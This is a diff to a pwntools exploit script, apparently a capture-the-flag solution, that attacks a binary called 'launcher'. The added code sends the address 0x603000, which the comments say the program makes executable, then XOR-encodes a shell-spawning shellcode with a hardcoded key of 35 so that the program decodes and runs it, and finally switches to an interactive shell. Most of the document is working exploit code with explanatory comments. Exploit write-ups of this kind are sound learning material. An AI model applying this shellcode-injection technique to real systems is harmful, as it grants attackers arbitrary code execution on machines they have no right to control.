@@ -7,8 +7,7 @@ from pwn import *
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF('launcher')
 context.terminal = "terminator -x".split()
-# We need ASLR to be disabled.
-context.aslr = False
+# context.aslr = False
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -40,20 +39,31 @@ continue
 # NX:       NX enabled
 # PIE:      No PIE (0x400000)
 
+# It can be seen with GDB+objdump that this program
+# calls mprotect(0x603000, 1, PROT_READ | PROT_WRITE | PROT_EXEC).
+
+# Secret XOR key is 35 (and it is hardcoded)
+
+init_code_addr = '0x603000'
+
 io = start()
+# We pass init_code_addr, so that the program copies the subsequent
+# input line from the fgets() input buffer to init_code_addr.
+io.sendline(init_code_addr)
 
-#io.sendline('0x00007ffff7ff7000')
-io.sendline('0x00007fffffffd600')
-io.sendline(asm(shellcraft.sh()) + '\x00')
+# Now assemble the shellcode to be sent to the program.
+code = asm(shellcraft.sh())
 
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
+# The program XORes each byte of the code sent with a 8-bit secret key.
+# By experimentation (e.g. io.sendline("abcdefg"), it can be easily
+# seen that the key is fixed and its value is 35. We can then XOR our
+# code with the same key, so that it the program will decipher it
+# and execute it.
+ccode = [chr(ord(x) ^ 35) for x in code]
+ccode = ''.join(ccode)
+io.sendline(ccode)
 
+# At this point the program has executed our code, which is a
+# shellcode. Switch to interactive to use the shell.
 io.interactive()
 
